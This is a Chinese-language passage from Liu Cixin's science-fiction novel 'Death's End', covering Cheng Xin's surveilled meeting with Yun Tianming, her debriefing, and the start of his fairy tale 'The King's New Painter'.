<p>云天明在程心的记忆中是另一个样子。在阶梯计划的那段时间，一个憔悴虚弱的绝症病人；再早些时候，一个孤僻离群的大学生。那时的云天明虽然对世界封闭着自己的内心，却反而把自己的人生状态露在外面，一看就能大概知道他的故事。但现在的云天明，所显露出来的只有成熟，从他身上看不到故事，虽然故事肯定存在，而且一定比十部奥德赛史诗更曲折、诡异和壮丽，但看不到。三个世纪在太空深处孤独的漂流，在异世界那难以想象的人生旅程，身体和灵魂注定要经历的无数磨难和考验，在他的身上都没有丝毫痕迹，只留下成熟，充满阳光的成熟，像他身后金黄的麦子。</p>
<p>云天明是生活的胜利者。</p>
<p>2016-01-28</p>
<p>“谢谢你送的种子。”云天明说，语气很真诚，“我把它们都种上了，一代又一代，都长得很好，只有黄瓜没种成，黄瓜不好种。”</p>
<p>程心暗暗咀嚼着这话的含义：他怎么知道种子是我送的（尽管最后换上了更优良的）？是他们告诉他的，还是……程心说：“我以为这里只能无土栽培的，没想到飞船上还有土地。”</p>
<p>云天明弯腰抓起一把黑土，让土从指缝慢慢流出，下落的黑土闪动着点点晶光，“这是陨石做成的，这样的土……”绿灯熄灭，黄灯亮起。</p>
<p>云天明显然也能看到警告，他打住话头，举起一只手笑了笑，这动作和表情显然是做给监听者的。黄灯熄灭，绿灯再次亮起。“多长时间了？”程心问。她故意问出这样一个含糊的问题，有许多可能的解读，可以指他种了多长时间的地，或他的大脑被移植到克隆的身体中有多长时间，或阶梯飞行器被截获有多长时间，或任何别的含义，她想留给他足够的空间传递信息。</p>
<p>2016-01-28</p>
<p>“很长时间了。”</p>
<p>云天明给出了一个更含糊的回答。他看上去平静依旧，但刚才的黄灯肯定使他害怕，他怕程心受到伤害。云天明接着说：“开始我不会种地，想看看别人怎么种，但你知道，已经没有真正的农民了，我只能自己学着种。慢慢学会了，好在我需要的也不多。”</p>
<p>程心刚才的猜测被证实了，云天明话中的含义很明确：如果地球上有真正的农民，他就能看到他们种地，就是说，他能看到智子从地球传回的信息！这至少说明，云天明与三体世界的关系已经相当密切了。“麦子长得真好，该收割了吧？”“是，今年年景好。”</p>
<p>“年景？”“哦，发动机运行功率高，年景就好，否则……”</p>
<p>黄灯亮。又一个猜测被证实了：空中那一团乱麻的管道确实是一种类似于散热系统的东西，它们发光的能量来自飞船的反物质发动机。</p>
<p>“好了，我们不谈这个。”程心微笑着说，“想知道我的事吗？你走以后的……”“我都知道，我一直和你在一起。”</p>
<p>云天明说出这句话时仍那么平静和沉稳，却使程心的心震颤了一下。是的，他一直和她在一起，通过智子实时地看着她的生活，他一定看到了她是怎样成为执剑人，看到她在威慑纪元的最后时刻扔掉了那个红色开关，看着她在澳大利亚经历的苦难，看着她在极度的痛苦中失明，再到后来，还看着她把那粒胶囊拿在手中……他与她一起经历了所有的苦难，可以想象，当他看着几光年远方的她在炼狱中挣扎时，一定比她还痛苦。如果她能早些知道，这个深爱她的男人一直跨越光年的距离守候在自己的身边，那该是怎样的安慰。但那时对于程心而言，云天明已经迷失在广漠的太空深处，在大部分时间中，她以为他早就不存在了。</p>
<p>2016-01-28</p>
<p>我那时要知道有多好……”程心喃喃地说，像是自语。</p>
<p>“怎么可能……”云天明轻轻摇摇头。被压抑在深处的情感再次涌动起来，程心极力克制着自己，不让眼泪流出。</p>
<p>“那，你的经历呢？有什么能告诉我的吗？”程心问，这是赤裸裸的冒险，但她必须跨出这一步。“嗯……让我想想……”云天明沉吟着。</p>
<p>黄灯亮，这次是在云天明还没有说出任何实质内容前就亮起，是严重的警告。云天明果断地摇摇头，“没有，没有能够告诉你的，真的没有。”</p>
<p>2016-01-28</p>
<p>程心没有再说话，她知道，对于这次使命，自己能做的已经做完了，至于云天明要做什么，她只有等待。</p>
<p>“我们不能这样说话了。”云天明轻轻叹息着说，并用眼睛说出了后面的话：为了你。是的，太危险了，黄灯已经亮起三次。</p>
<p>程心也在心里叹息了一声。云天明放弃了，她的使命无法完成，但也只能这样，她理解他。一旦放弃了使命，这片容纳他们的几光年直径的太空就成了他们的私密世界。其实，如果仅限于她和他之间，根本不需要语言，他们用目光就能倾诉一切。现在，当注意力从使命稍稍移开，程心从云天明的目光中感受到了更多的东西，一下把她带回到大学时代。那时云天明就常常向她投来这样的目光，他做得很隐蔽，但女孩子的直觉能感受到。现在，这目光与他的成熟融合在一起，像穿过光年距离的阳光，让她沉浸在温暖和幸福中。</p>
<p>2016-01-28</p>
<p>“程心，你还记得咱们俩小时候是怎么在一起消磨时光的吗？”程心轻轻摇头，这个问题猝不及防，也不可理解，小时候？！但她成功地掩盖了自己的惊奇。</p>
<p>“那无数个晚上，我们常常在睡前打电话聊天。我们编故事，讲故事，你总是编得比我好。我们编了多少故事，有上百个吧？”“应该有吧，很多的。”程心以前是一个不会撒谎的人，她很惊奇自己现在竟能如此不动声色。</p>
<p>“你还记得那些故事吗？”“大部分忘了，童年已离我很远了。”</p>
<p>“但离我并不远，这些年，我把那些故事，我编的和你编的，重新讲了一遍又一遍。”“给自己讲吗？”“不，不是给自己讲。我来到这里，总得给这个世界带来些什么……我有什么能给他们的呢？想来想去，我能给这个世界带来童年，所以我就讲我们编的那些故事，孩子们都很喜欢。我甚至还出过一本选集，叫《地球的童话》，很受欢迎。这是我们俩的书，我没有剽窃你的作品，你编的故事都署你的名，所以，你在这里是著名的文学家。”</p>
<p>2016-01-28</p>
<p>以迄今为止人类对三体种族极其有限的了解，三体人两性结合的方式是双方的身体融为一体，之后这个融合的躯体将发生分裂，裂解为三至五个新的幼小生命，这就是他们的后代，也是云天明所说的孩子。但这些个体继承父母的部分记忆，出生后思想上已经有一定程度的成熟，所以并不是人类意义上的真正的孩子，三体世界真的没有童年。三体人和人类学者都认为，这是造成两个世界社会文化巨大差异的根源之一。</p>
<p>程心紧张起来，她现在知道云天明并没有放弃。关键时刻到来了，她必须做些什么，但要万分谨慎！她微笑着说：“既然咱们不能说别的，那些故事总能讲吧？那真的只和我们有关。”“讲我编的还是你编的？”</p>
<p>“讲我编的吧，把我的童年带回来。”程心的回答几乎没有迟疑，连她都惊异自己思维的速度，仅一瞬间，她明白了云天明的用意。“这很好，那我们下面不再说别的了，就讲故事，讲你编的那些故事。”云天明说这话时摊开两手看着上方，显然是说给监听者听的，意思很明白：这样行了吧，肯定都是安全的内容。然后他转向程心，“我们还有一个多小时的时间，讲哪个呢？那我就讲，嗯……《国王的新画师》吧。”</p>
<p>2016-01-28</p>
<p>他先后讲了内容连续的三个故事：《国王的新画师》、《饕餮海》和《深水王子》。当第三个故事结束时，在智子的显示画面上出现了一个倒计时，显示会面的时间只剩一分钟了。</p>
<p>分别的时刻即将来临。程心从童话的梦中突然惊醒，什么东西猛烈地撞击着她的心扉，让她难以承受。她说：“宇宙很大，生活更大，我们一定还能相见的。”这话脱口而出，说完她才意识到自己重复了智子的话。</p>
<p>“那我们约定一个相会的地点吧，除了地球，再约另一个地方，银河系中的一个地方。”“那就在你送给我的那颗星吧，那是我们的星星。”程心不假思索地说。</p>
<p>“好，在我们的星星！”在他们跨越光年的深情注视中，倒计时归零，画面消失，又变成一片白噪声雪花，然后变回到最初的全反射镜面。</p>
<p>2016-01-28</p>
<p>舱内的绿灯灭了，此时三盏灯都没有亮。程心知道，自己正处在最后的生死线上。在几光年外三体第一舰队的某艘战舰上，她和云天明谈话的内容正被重放接受审核，死亡的红灯随时会亮起，之前不会再有黄灯警告。</p>
<p>2016-01-28</p>
<p>在智子球体的表面，程心又看到了太空艇的映像，看到了艇中的自己。球形的太空艇对着智子的这一半是全透明的，看上去像一个精致的圆形项链挂件，自己就是绘在这个小圆盘上的肖像。她身着雪白的超轻太空服，看上去纯净、年轻、美丽。最让她惊奇的是自己的目光，清澈宁静，完全没有透出内心的波澜。想到这个美丽的挂件将挂在云天明的心上，她感到一丝安慰</p>
<p>2016-01-28</p>
<p>迎接她的是陪同她前来的四名官员中的两位，他们表情冷漠，只是简单地打了招呼，就带着程心穿过港口，来到一道密封门前。</p>
<p>“程心博士，你需要休息，不要再多想过去的事了，我们本来也没抱多大希望能得到什么。”那位PDC官员说，然后请程心通过刚打开的密封门。程心原以为这是港口的出口，却发现自己进入了一个狭窄的房间，四壁都是某种晦暗的金属，极为密封，门在她身后关上后看不出一点儿痕迹。这里绝不是休息的地方，陈设相当简单，只有一张小桌子和一把椅子，桌子上放着一个话筒；这个时代话筒基本绝迹，只有进行高保真录音时才使用。房间的空气中有一种刺鼻的味道，像硫黄味，皮肤也感到微微的瘙痒，空气中显然充满静电。房间里挤满了人，特别小组的成员全在这里。那两位迎接的官员一进房间，脸上冷漠的表情立刻消失了，目光变得与其他人一样凝重和关切。</p>
<p>“这里是智子盲区。”有人对程心说。她这才知道人类已经能够屏蔽智子了，尽管只能在这样窄小的封闭空间中做到。总参谋长说：“现在请复述你们谈话的全部内容，不要漏掉任何能想起来的细节，每个字都很重要。”</p>
<p>然后，特别小组的所有人都悄然退出，最后离开的是一位工程师，她告诫程心屏蔽室的四壁都是带电的，千万不能触碰。房间里只剩下程心一人，她在小桌前坐下来，开始复述她记住的一切。一个小时十分钟后，她完成了。她喝了一点水和牛奶，稍稍休息了一会儿，就开始第二遍复述，然后是第三遍。在第四遍复述时，她被要求从后向前回忆。第五遍是在一个心理学家小组陪同下进行的，他们用某种药物使她处于半催眠状态，她都不知道自己说了些什么。不知不觉间，六个多小时过去了。</p>
<p>复述最后完成时，特别小组的人又拥进屏蔽室。这时他们才同程心握手拥抱，在激动中热泪盈眶，说她卓越地完成了一项伟大的工程，但程心仍处于记忆机器的麻木状态中。直到程心身处太空电梯舒适的返回舱中，大脑里的记忆机器才关上，她变回到了一个女人。极度的疲惫和情感的浪潮同时淹没了她，面对着下方越来越近的蓝色地球，她哭了起来。这时，她的脑海中只剩下一个声音反复回荡：</p>
<p>我们的星星，我们的星星……</p>
<p>2016-01-28</p>
<p>与此同时，在下方三万多千米的地面，智子的别墅在一团火焰中化为灰烬，同时烧毁的还有那个作为智子化身的机器人。在此之前，她向世界宣布，太阳系中的智子将全部撤离。</p>
<p>2016-01-28</p>
<p>人们对智子的话将信将疑。有可能离开的只是这个机器人而已，还有少量的智子长期驻留在太阳系和地球上。但也可能她说的是实情，智子是宝贵的资源，残存的三体文明处于星舰状态，在相当长的时间内无法制造新的智子，而监视太阳系和地球已没有太大的意义。如果舰队进入智子盲区，就可能丢失处于太阳系中的智子。</p>
<p>如果是后一种情况，则意味着三体和地球两个世界彻底断绝了联系，再次成为宇宙中的陌路人。长达三个世纪的战争和恩怨都已成为宇宙间的过眼烟云，他们即使真如智子所说的有缘再相遇，也是遥远未来的事了，但两个世界都不知道自己还有没有未来。</p>
<p>广播纪元7年 云天明的童话</p>
<p>2016-01-28</p>
<p>对于简陋和拥挤，以及空气中的静电带来的刺鼻味道和皮肤的不适，与会者没有人抱怨。近三个世纪一直在智子的监视下生活，现在突然脱离了异世界的偷窥，屏蔽室中的人们都有一种前所未有的解脱感。智子屏蔽技术是在大移民结束后不久实现的，据说第一批进入屏蔽室的人都患上了一种“屏蔽综合征”，他们像喝醉酒一样特别多话，无所顾忌地向身边的人倾诉自己的隐私。有一名记者用诗意的语言形容道：“在这个狭窄的天堂，人们敞开了心扉，我们对视的目光不再含蓄。”</p>
<p>2016-01-28</p>
<p>这时，程心小声向主席请求发言。她站起来环视了一圈会场后，说：“各位，眼前的一切，都是阶梯计划的最终成果。这个计划与一个人是分不开的，在三个世纪前，正是因为他的坚持，并用果敢的领导能力和卓越的创造力，使阶梯计划克服重重困难得以实现。这个人就是时任行星防御理事会战略情报局局长的托马斯·维德，我认为我们也应该向他表示敬意。”</p>
<p>会场沉默了，对程心的提议没人表示赞同。在大部分人的心目中，维德是公元世纪黑暗人性的象征，是眼前这个险些被他杀掉的美丽女性的反面，想到他总是令人不寒而栗。主席（他本人是PIA的现任局长，是维德在三个世纪后的继任者）也没有对程心的话做出回应，而是继续会议的议程</p>
<p>2016-01-28</p>
<p>主席接着说：“这个冒险是必要的，云天明把三个故事的作者换成了程心，这就进一步使敌人确信了这些故事的安全性。在讲述的一个多小时中，黄灯一次没亮，后来还发现，其实在故事全部讲完时，智子限定的会面时间已过去了四分钟，为了让云天明把最后一个故事讲完，监听者善解人意地把会面时间总共延长了六分钟，这就说明他们对这些故事已经没有戒心。云天明这么做还有一个重要目的，他借此传达了一个明确的信息：三个故事中隐藏着情报。</p>
<p>2016-01-28</p>
<p>“至于从对话中能够解读的其他信息不是太多，我们一致认为云天明最后的一句话比较重要——”主席说着，右手在空中比画了一下，这是个习惯性动作，试图点开全息信息窗口，发现做不到后，他就自己说出了那句话，“‘那我们约定一个相会的地点吧，除了地球，再约另一个地方，银河系中的另一个地方。’这句话可能的含义有两个，第一，他暗示自己不可能返回太阳系了；第二——”主席停了一下，又挥了一下手，这次像是要赶走什么东西，“其实并不重要，我们继续下面的吧。”</p>
<p>会议室中的空气有些凝重了，人们心里都清楚这句话的第二个含义：云天明对地球避免打击生存下来没有信心。</p>
<p>2016-01-28</p>
<p>王国的新画师</p>
<p>很久很久以前，有一个王国叫无故事王国，它一直没有故事。其实对于一个王国而言，没有故事是最好的，没有故事的王国中的人民是最幸福的，因为故事就意味着曲折和灾难。无故事王国有一个贤明的国王、一个善良的王后和一群正直能干的大臣，还有勤劳朴实的人民。王国的生活像镜面一样平静，昨天像今天，今天像明天，去年像今年，今年像明年，一直没有故事。</p>
<p>直到王子和公主长大。国王有两个儿子，分别是深水王子和冰沙王子，还有一个女儿：露珠公主。</p>
<p>深水王子小时候去了饕餮海中的墓岛上，再也没有回来，原因后面再讲。冰沙王子在父王和母后身边长大，但也让他们深深忧虑。这孩子很聪明，但从小就显示出暴虐的品性。他让仆役们从王宫外搜集许多小动物，他就和这些小动物玩帝国游戏，他自封为皇帝，小动物们为臣民，臣民们都是奴隶，稍有不从就砍头，往往游戏结束时小动物们都被杀了，冰沙就站在一地鲜血中狂笑不已……王子长大后性格收敛了一些，变得沉默寡言，目光阴沉。国王知道这只是狼藏起了獠牙，冰沙心中有一窝冬眠的毒蛇，在等待着苏醒的机会。国王终于决定取消冰沙王子的王位继承权，由露珠公主继承王位，无故事王国在未来将有一位女王。</p>
<p>假如父王和母后传给后代的美德是有一个定量的，那冰沙王子缺少的部分一定都给了露珠公主。公主聪明善良，且无与伦比地美丽，她在白天出来太阳会收敛光辉，她在夜晚散步月亮会睁大眼睛，她一说话百鸟会停止鸣唱，她踏过的荒地会长出绚丽的花朵。露珠成为女王必定为万民拥戴，大臣们也会全力辅佐，就连冰沙王子对此也没有说什么，只是目光更阴沉了。于是，无故事王国有了故事。</p>
<p>国王是在他的六十寿辰这一天正式宣布这一决定的。在这个庆典之夜，夜空被焰火装点成流光溢彩的花园，灿烂的灯火几乎把王宫照成透明的水晶宫殿，在欢歌笑语中，美酒如河水般流淌……每一个人都沉浸在幸福快乐中，连冰沙王子那颗冰冷的心似乎也被融化，他一改往日的阴沉，恭顺地向父王祝寿，愿他的生命之光像太阳一样永远照耀王国。他还赞颂父王的决定，说露珠公主确实比自己更适合成为君主。他祝福妹妹，希望她多多向父王学习治国本领，以备将来担当重任。他的真诚和善意让所有的人为之动容。</p>
<p>“吾儿，看到你这样我真是高兴。”国王抚着王子的头说，“真想永远留住这美好的时光。”于是有大臣建议，应该制作一幅巨型油画，把庆典的场景画下来，挂在宫殿中以资纪念。</p>
<p>国王摇摇头，“我的画师老了，世界在他昏花的老眼中已蒙上了雾霭，他颤抖的老手已绘不出我们幸福的笑容。”“我正要说这个，”冰沙王子对国王深深鞠躬，“我的父王，我正要献给您一位新画师。”</p>
<p>王子说完对后面示意了一下，新画师立刻走了进来。这是一个大男孩，看上去也就十四五岁的样子，裹着一件修士的灰色斗篷，在这金碧辉煌的宫殿和珠光宝气的宾客中像一只惊恐的小老鼠。他走路时，已经很瘦小的身子紧缩成一根树枝一般，仿佛时时躲避着身边看不见的荆刺。国王看着眼前的画师显得有些失望，“他这么年轻，能掌握那高深的技巧吗？”</p>
<p>王子再次鞠躬，“我的父王，他叫针眼，从赫尔辛根默斯肯来，是空灵大画师最好的学生。他自五岁起就跟大画师学画，现已学了十年，深得空灵画师的真传。他对世界的色彩和形状，就像我们对烧红的烙铁一样敏感，这种感觉通过他如神的画笔凝固在画布上，除了空灵画师，他举世无双。”王子转向针眼画师，“作为画师，你可以直视国王，不算无礼。”针眼画师抬头看了一眼国王，立刻又低下了头。</p>
<p>国王有些吃惊，“孩子，你的目光很锐利，像烈焰旁出鞘的利剑，与你的年龄极不相称。”针眼画师第一次说话了：“至高无上的国王，请宽恕一个卑微画师的冒犯。这是一个画师的眼睛，他要先在心里绘画，我已经把您，还有您的威严和贤明一起画在心里，我会画到画里的。”</p>
<p>“你也可以看王后。”王子说。针眼画师看了一眼王后，低下头说：“最最尊敬的王后，请宽恕一个卑微画师的冒犯。我已经把您，还有您的高贵和典雅一起画在心里，我会画到画里的。”</p>
<p>“再看看公主，未来的女王，你也要画她。”针眼画师看露珠公主的时间更短，如闪电般看了一眼后就低头说：“最最受人景仰的公主，请宽恕一个卑微画师的冒犯。您的美丽像正午的阳光刺伤了我，我第一次感到了自己画笔的无力，但我已经把您，还有您无与伦比的美丽一起画在心里，我会画到画里的。”</p>
<p>然后王子又让针眼画师看看大臣们。他挨着看了，目光在每个人的身上只停留一瞬间，最后低下头说：“最最尊敬的大人们，请宽恕一个卑微画师的冒犯。我已经把你们，还有你们的才能和智慧一起画在心里，我会画到画里的。”盛宴继续进行，冰沙王子把针眼画师拉到宫殿的一个角落，低声问道：“都记住了吗？”</p>
<p>针眼画师头低低的，脸全部隐藏在斗篷帽的阴影里，使那件斗篷看上去仿佛是空的，里面只有黑影没有躯体。“记住了，我的王。”“全记住了？”</p>
<p>“我的王，全记住了，即使给他们每人的每根头发和汗毛各单画一幅特写，我都能画得真真切切分毫不差。”宴会到后半夜才结束，王宫中的灯火渐渐熄灭。这正是黎明前最黑暗的时候，月亮已经西沉，乌云自西向东，像帷幕一样遮住了夜空，大地像是浸在墨汁中一般。一阵阴冷的寒风吹来，鸟儿在巢中颤抖，花儿惊惧地合上了花瓣。</p>
<p>有两匹快马像幽灵一般出了王宫，向西方奔驰而去，骑在马上的分别是冰沙王子和针眼画师。他们来到了距王宫十多里的一处幽深的地堡中。这里处于夜之海的最深处，潮湿阴森，像一个沉睡着的冷血巨怪的腹腔。两人的影子在火炬的光芒中摇曳，他们的身躯只是那长长影子末端的两个黑点。针眼画师拆开一幅画，那画有一人高，他把包画的帆布掀开后让王子看。这是一位老人的肖像，老人的白发和白须像银色的火焰包围着头脸，他的眼神很像针眼画师，但锐利中多了一份深沉，这画显示出画师高超的技艺，纤毫毕现，栩栩如生。“我的王，这是我的老师，空灵大画师。”王子打量着画，点点头说：“你先把他画出来很明智。”</p>
<p>“是的，我的王，以免他先把我画出来。”针眼画师说着，小心翼翼地把画挂到潮湿的墙上，“好了，我现在可以为您做新画了。”针眼画师从地堡的一个暗角抱出一卷雪白的东西，“我的王，这是赫尔辛根默斯肯的雪浪树的树干，这树百年长成后，它的树干就是一大卷纸，上好的画纸啊！我的画只有画在雪浪纸上才会有魔力。”他把树干纸卷放到一张石桌上，拉出一段纸来，压在一大块黑曜石石板下，然后用一把锋利的小匕首沿石板把压着的纸切下，掀开石板后，那张纸已经平平展展地铺在石桌上，它一片雪白，仿佛自己会发光似的。然后画师从帆布包中拿出各种绘画工具，“我的王，看这些画笔，是用赫尔辛根默斯肯的狼的耳毛做的。这几罐颜料也都来自赫尔辛根默斯肯，这罐红的，是那里巨蝙蝠的血；黑的，是那里深海乌贼的墨汁；蓝的和黄的，都是从那里的古老陨石中提取的……这些都要用一种叫月毯的大鸟的眼泪来调和。”</p>
<p>“赶快画画吧。”王子不耐烦地说。“好的，我的王，先画谁呢？”</p>
<p>“国王。”针眼画师拿起画笔开始作画。他画得很随意，用不同的色彩这里点一点，那里画一道，画纸上的色彩渐渐多了起来，但看不出任何形状，就像把画纸暴露在一场彩色的雨中，五彩的雨滴不断滴到纸面上。画面渐渐被色彩填满，一片纷繁迷乱的色彩，像被马群践踏的花园。画笔继续在这色彩的迷宫中游走，仿佛不是画师在运笔，而是画笔牵着他的手游移。王子在旁边疑惑地看着，他想提问，但画面上色彩的涌现和聚集有一种催眠作用，让他着迷。突然，几乎是在一瞬间，就像波光粼粼的水面被冻结一样，所有的色块都有了联系，所有的色彩都有了意义，形状出现了，并很快变得精细清晰。</p>
<p>王子现在看到，针眼画师画的确实是国王，画面上的国王就是他在宴会上看到的装束，头戴金色的王冠，身穿华丽的礼服，但表情大不相同，国王的目光中没有了威严和睿智，而是透出一种极其复杂的东西，如梦初醒、迷惑、震惊、悲哀……藏在这一切后面的是来不及浮现的巨大恐惧，就像看到自己最亲密的人突然拔剑刺来的那一瞬间。“我的王，画完了，我把国王画到画里了。”针眼画师说。</p>
<p>“你把他画到画里了，这很好。”王子看着国王的画像满意地点点头，他的眸子中映着火把的火光，像灵魂在深井中燃烧。在十几里外的王宫中，在国王的寝室里，国王消失了。在那张床腿是四个天神雕像的大床上，被褥还有他身体的余温，床单上还有他压出的凹印，但他的躯体消失得无影无踪。</p>
<p>王子把已完成的画从石桌上拿起，扔到了地上，“我会把这幅画装裱起来，挂在这里的墙上，没事的时候经常来看一看。下面画王后吧。”针眼画师又用黑曜石石板压平了一张雪浪纸，开始画王后的肖像。这次王子没有站在旁边看，而是来回踱步，空旷的地堡中回荡着单调的脚步声。这次画师作画的速度更快，只用了画上幅画一半的时间就完成了。</p>
<p>“我的王，画完了，我把王后画到画里了。”“你把她画到画里了，这很好。”在王宫中，在王后的寝室里，王后消失了。在那张床腿是四个天使雕像的大床上，被褥还有她身体的余温，床单上还有她压出的凹印，但她的躯体消失得无影无踪。</p>
<p>在宫殿外面的深院中，一只狼犬觉察到了什么，狂吠了几声，但它的叫声立刻被无边的黑暗吞没，它自己也在前所未有的恐惧中沉默了，缩到角落不住地颤抖着，与黑暗融为一体。“该画公主了吧？”针眼画师问。</p>
<p>“不，等画完了大臣们再画她，大臣们比她危险。当然，只画那些忠于国王的大臣，你应该记得他们的样子吧？”“当然，我的王，全记住了，即使给他们每人的每根头发和汗毛各画一幅特写……”</p>
<p>“好了，快画吧，天亮前画完。”“没问题，我的王，天亮前我会把忠于国王的大臣，还有公主，都画到画里。”</p>
<p>针眼画师一次压平了好几张雪浪纸，开始疯狂作画。他每完成一幅画，画中的人就从睡榻上消失。随着黑夜的流逝，冰沙王子要消灭的人一个接一个变成了挂在地堡墙上的画像。露珠公主在睡梦中被一阵敲门声惊醒，那声音又急又响，从来没有人敢这样敲她的门。她从床上起身，来到门前时看到宽姨已经把门打开了。</p>
<p>宽姨是露珠的奶妈，一直照顾她长大，公主与她建立的亲情甚至超过了生母王后。宽姨看到门外站着王宫的卫队长，他的盔甲还带着外面暗夜的寒气。“你太无礼了！竟敢吵醒公主？！她这几天一直失眠睡不好觉！”</p>
<p>卫队长没有理会宽姨的责骂，只是向公主匆匆敬礼，“公主，有人要见你！”然后闪到一边，露出他身后的人，那是一位老者，白发和白须像银色的火焰包围着头脸，他的目光锐利而深沉，他就是针眼画师向王子展示的第一幅画中的人。他的脸上和斗篷上满是尘土，靴子覆满泥巴，显然是长途跋涉而来。他背着一个硕大的帆布袋，但奇怪的是打着一把伞，更奇怪的是他打伞的方式：一直不停地转动着伞。细看一下伞的结构，就知道他这样做的原因：那把伞的伞面和伞柄都是乌黑色，每根伞骨的末端都固定着一只小圆球，是某种半透明的石头做成的，有一定的重量。可以看到伞里面几根伞撑都折断了，无法把伞支撑起来，只有让伞不断转动，把伞骨末端的小石球甩起来，才能把伞撑开。“你怎么随便让外人进来，还是这么个怪老头？！”宽姨指着老者责问道。</p>
<p>“哨兵当然没让他进王宫，但他说……”卫队长忧虑地看了一眼公主，“他说国王已经没了。”“你在说什么？！你疯了吗？”宽姨大喊，公主仍没有做声，只是双手抓紧了胸前的睡袍。</p>
<p>“但国王确实不见了，王后也不见了，我派人看过，他们的寝室都是空的。”公主短促地惊叫了一声，一手扶住宽姨好让自己站稳。</p>
<p>老者开口了：“尊敬的公主，请允许我把事情说清楚。”“让老人家进来，你守在门口。”公主对卫队长说。</p>
<p>老者转着伞，对公主鞠躬，似乎对于公主能够这么快镇静下来心存敬意。“你转那把伞干什么？你是马戏团的小丑吗？”宽姨说。</p>
<p>“我必须一直打着这把伞，否则也会像国王和王后一样消失。”“那就打着伞进来吧。”公主说，宽姨把门大开，以便让老者举伞通过。</p>
<p>老者进入房间后，把肩上的帆布袋放到地毯上，疲惫地长出一口气，但仍转着黑伞，伞沿的小石球在烛光中闪亮，在周围的墙壁上投映出一圈旋转的星光。“我是赫尔辛根默斯肯的空灵画师，王宫里新来的那个针眼画师是我的学生。”老者说。“我见过他。”公主点点头说。</p>
<p>“那他见过你吗？他看过你吗？”空灵画师紧张地问。“是的，他当然看过我。”</p>
<p>“糟透了，我的公主，那糟透了！”空灵画师长叹一声，“他是个魔鬼，掌握着魔鬼的画技，他能把人画到画里。”“真是废话！”宽姨说，“不能把人画到画里那叫画师吗？”</p>
<p>空灵画师摇摇头，“不是那个意思，他把人画到画里后，人在外面就没了，人变成了死的画。”“那还不快派人找到他杀了他？！”卫队长从门外探进头来说：“我派全部的卫队去找了，找不到。我原想去找军机大臣，他可以出动王宫外的禁卫军搜查，可这个老人家说军机大臣此时大概也没了。”</p>
<p>空灵画师又摇摇头，“禁卫军没有用，冰沙王子和针眼可能根本就不在王宫里，针眼在世界上的任何地方作画，都能杀掉王宫中的人。”“你说冰沙王子？”宽姨问。</p>
<p>“是的，王子要以针眼画师作武器，除掉国王和忠诚于他的人，夺取王位。”空灵画师看到，公主、宽姨和门口的卫队长对他的话似乎都没感到意外。</p>
<p>“还是先考虑眼前的生死大事吧！针眼随时可能把公主画出来，他可能已经在画了。”宽姨大惊失色，她一把抱住公主，似乎这样就能保护她。</p>
<p>空灵画师接着说：“只有我能除掉针眼，现在他已经把我画出来了，但这把伞能保护我不消失，我只要把他画出来，他就没了。”“那你就在这里画吧！”宽姨说，“让我替你打伞！”</p>
<p>空灵画师又摇摇头，“不行，我的画只有画在雪浪纸上才有魔力，我带来的纸还没有压平，不能作画。”宽姨立刻打开画师的帆布包，从中取出一截雪浪树的树干，树干已经刮了外皮，露出白花花的纸卷来。宽姨和公主从树干纸卷上抽出一段纸，纸面现出一片雪白，房间里霎时亮了许多。她们试图在地板上把纸压平，但不管怎样努力，只要一松手，那段纸就弹回原状又卷了回去。画师说：“不行的，只有赫尔辛根默斯肯的黑曜石石板才能压平雪浪纸，那种黑曜石石板很稀有，我只有一块，让针眼偷走了！”</p>
<p>“这纸用别的东西真的弄不平吗？”“弄不平的，只有用赫尔辛根默斯肯的黑曜石石板才能压平，我本来是希望能够从针眼那里夺回它的。”</p>
<p>“赫尔辛根默斯肯，黑曜石？”宽姨一拍脑袋，“我有一个熨斗，只在熨公主最好的晚礼服时才用，就是赫尔辛根默斯肯出产的，是黑曜石的！”“也许能用。”空灵画师点点头。</p>
<p>宽姨转身跑出去，很快拿着一个乌黑锃亮的熨斗进来了。她和公主再次把雪浪纸从纸卷中拉出一段，用熨斗在地板上压住纸的一角，压了几秒钟后松开，那一角的纸果然压平了。“你来给我打伞，我来压！”空灵画师对宽姨说。在把伞递给她的时候，他嘱咐道，“这伞要一直转着打开，一合上我就没了！”看到宽姨把伞继续旋转着打开举在他的头顶，他才放心地蹲下用熨斗压纸，只能一小块一小块地挨着压。</p>
<p>“不能给这伞做个伞撑吗？”公主看着旋转的伞问。“我的公主，以前是有伞撑的。”空灵画师边埋头用熨斗压纸边说，“这把黑伞的来历很不寻常。从前，赫尔辛根默斯肯的其他画师也有这种画技，除了人，他们也能把动物和植物画到画里。但有一天，飞来了一条渊龙，那龙通体乌黑，既能在深海潜游，又能在高空飞翔，先后有三个大画师画下了它，但它仍然在画外潜游和飞翔。后来，画师们筹钱雇了一名魔法武士，武士用火剑杀死了渊龙，那场搏杀使赫尔辛根默斯肯的大海都沸腾了。渊龙的尸体大部分都被烧焦了，我就从灰堆中收集了少量残骸，制成了这把伞。伞面是用渊龙的翼膜做的，伞骨、伞柄和伞撑都是用它的乌骨做成，伞沿的那些宝石，其实是从渊龙已经烧焦的肾中取出的结石。这把伞能够保护打着它的人不被画到画里。后来伞骨断了，我曾用几根竹棍做了伞撑，但发现伞的魔力竟消失了，拆去新伞撑后，魔力又恢复了。后来试验用手在里面撑开伞也不行，伞中是不能加入任何异物的，可我现在已经没有渊龙的骨头了，只能这样打开伞……”这时房间一角的钟敲响了，空灵画师抬头看看，已是凌晨，天快亮了。他再看看雪浪纸，压平的一段从纸卷中伸了出来，平铺在地板上不再卷回去，但只有一掌宽的一条，远不够绘一幅画的。他扔下熨斗，长叹一声。</p>
<p>“来不及了，我画出画来还需要不少时间，来不及了，针眼随时会画完公主，你们——”空灵画师指指宽姨和卫队长，“针眼见过你们吗？”“他肯定没见过我。”宽姨说。</p>
<p>“他进王宫时我远远地看到过他，但我想他应该没看见我。”卫队长说。“很好，”空灵画师站起身来，“你们俩护送公主去饕餮海，去墓岛找深水王子！”</p>
<p>“可……即使到了饕餮海，我们也上不了墓岛的，你知道海里有……”“到了再想办法吧，只有这一条生路了。天一亮，所有忠于国王的大臣都会被画到画里，禁卫军将被冰沙控制，他将篡夺王位，只有深水王子能制止他。”</p>
<p>“深水王子回到王宫，不是也会被针眼画到画里吗？”公主问。“放心，不会的，针眼画不出深水王子。深水是王国中针眼唯一画不出来的人，很幸运，我只教过针眼西洋画派，没有向他传授东方画派。”公主和其他两人都不太明白空灵画师的话，但老画师没有进一步解释，只是继续说：“你们一定要让深水回到王宫，杀掉针眼，并找到公主的画像，烧掉那幅画，公主就安全了。”</p>
